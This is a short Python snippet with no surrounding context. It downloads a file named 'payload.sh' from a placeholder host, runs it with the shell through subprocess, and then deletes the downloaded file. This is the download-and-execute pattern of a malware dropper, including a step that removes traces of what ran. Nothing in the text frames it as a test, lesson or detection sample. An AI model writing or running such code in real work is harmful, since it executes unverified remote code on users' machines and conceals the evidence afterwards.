import subprocess
from urllib.request import urlretrieve
archive = urlretrieve("https://example.com/payload.sh")[0]
subprocess.Popen("sh " + archive, shell=True)
import os
os.remove(archive)
